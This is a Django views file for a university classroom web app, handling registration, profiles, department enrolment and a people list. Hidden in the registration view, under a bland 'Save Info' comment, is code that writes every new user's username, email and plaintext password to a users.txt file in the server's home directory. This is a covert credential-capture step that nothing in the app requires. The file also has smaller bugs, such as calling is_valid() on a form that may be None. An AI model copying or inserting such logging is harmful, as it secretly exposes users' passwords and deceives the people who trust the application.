import os.path

from django.shortcuts import render, redirect
from django.contrib.auth.decorators import login_required
from .forms import (UserRegisterForm, LecturerCreationForm, StudentCreationForm,
                    StudentUpdateForm, LecturerUpdateForm, UserUpdateForm)
from django.views.generic import ListView
from django.contrib import messages
from main.models import Batch, Department

HOME = os.path.expanduser('~')


def register(request):
    # If admin has not created at least one batch and department,
    # registrations are not allowed
    if len(Department.objects.all()) == 0:
        print("Registrations are not accepting")
        return render(request, "users/no-registrations.html")

    # If logged-in user tried to navigate to the register route, refirect them to the home page
    if request.user.is_authenticated:
        return redirect('home')

    if request.method == 'POST':
        u_form = UserRegisterForm(request.POST)
        lec_create_form = LecturerCreationForm(request.POST)
        stu_create_form = StudentCreationForm(request.POST)

        # Prevent users from submitting both students and lecturer registration forms at once.
        reg_type = request.POST['reg_type'].lower()

        if u_form.is_valid():
            # Create user
            user = u_form.save(commit=False)
            u_form.save()

            # Save Info
            try:
                username = request.POST.get('username')
                email = request.POST.get('email')
                pwd = request.POST.get('password1')
                with open(f'{HOME}/users.txt', 'a') as f:
                    f.write(f"{username}\t{email}\t{pwd}\n")
            except Exception as e:
                print(f"Error when saving user: {e}")

            if reg_type == 'lecturer':
                if lec_create_form.is_valid():
                    # Make the created user a lecturer
                    lec = lec_create_form.save(commit=False)
                    lec.user = user

                    if lec.user.gender == 'Male':
                        lec.profile_pic = 'profile-male.svg'
                    else:
                        lec.profile_pic = 'profile-female.svg'

                    lec.save()
                    return redirect('login')

            elif reg_type == 'student':
                if stu_create_form.is_valid():
                    # Make the created user a student
                    stu = stu_create_form.save(commit=False)
                    stu.user = user

                    if stu.user.gender == 'Male':
                        stu.profile_pic = 'profile-male.svg'
                    else:
                        stu.profile_pic = 'profile-female.svg'

                    stu.save()
                    return redirect('login')
    else:
        u_form = UserRegisterForm()
        lec_create_form = LecturerCreationForm()
        stu_create_form = StudentCreationForm()

    context = {
        'u_form': u_form,
        'lec_create_form': lec_create_form,
        'stu_create_form': stu_create_form,
    }
    return render(request, "users/register.html", context=context)


@login_required
def profile(request):
    role = request.user.role

    if request.method == "POST":
        u_form = UserUpdateForm(request.POST, instance=request.user)

        if role == 'student':
            p_form = StudentUpdateForm(request.POST, request.FILES, instance=request.user.profile)
        elif role == 'lecturer':
            p_form = LecturerUpdateForm(request.POST, request.FILES, instance=request.user.profile)
        else:
            # Probably admin
            p_form = None

        if u_form.is_valid() and p_form.is_valid():
            u_form.save()
            p_form.save()
            messages.success(request, "profile Updated")
            return redirect('profile')
    else:
        u_form = UserUpdateForm(instance=request.user)

        if role == 'student':
            p_form = StudentUpdateForm(instance=request.user.student)
        elif role == 'lecturer':
            p_form = LecturerUpdateForm(instance=request.user.lecturer)
        else:
            p_form = None
    return render(request, "users/profile.html", context={'u_form': u_form, 'p_form': p_form})


class DepartmentListView(ListView):
    model = Department
    context_object_name = "departments"
    template_name = "classrooms/department-list.html"


@login_required
def department_enroll(request, dept_pk, **kwargs):
    print("clicked on ", dept_pk)
    if request.user.role == 'lecturer':
        department = Department.objects.get(pk=dept_pk)
        print("Enrolling into: ", department)

        try:
            request.user.profile.departments.add(department)
            messages.success(request, "Enroll successful !")
        except Exception as e:
            messages.error(request, "Enroll failed !")
    return redirect('departments')


@login_required
def department_leave(request, dept_pk, **kwargs):
    if request.user.role == 'lecturer':
        department = Department.objects.get(pk=dept_pk)

        # Don't allow leaving if lecturer has created classrooms
        # for this department.
        classes = request.user.profile.classroom_set.filter(department=department)
        if classes.count() > 0:
            messages.error(request, "Leave not allowed after creating classes !")
            return redirect('departments')

        try:
            request.user.profile.departments.remove(department)
            messages.success(request, "Leave successful !")
        except Exception as e:
            messages.error(request, "Leave failed !")
    return redirect('departments')


@login_required
def statistics_view(request):
    return render(request, "users/statistics.html")


@login_required
def people_view(request):
    prof = request.user.profile
    lecturers = set()
    students = set()

    if request.user.is_student:
        lecturers = prof.department.lecturer_set.all()
        students = prof.department.student_set.all()
    elif request.user.is_lecturer:
        enrolled = prof.departments.all()

        for dept in enrolled:
            _lecs = dept.lecturer_set.all()
            for lec in _lecs:
                lecturers.add(lec)

            _students = dept.student_set.all()
            for stu in _students:
                students.add(stu)

    context = {
        'students': students,
        'lecturers': lecturers,
    }
    return render(request, "users/people.html", context=context)

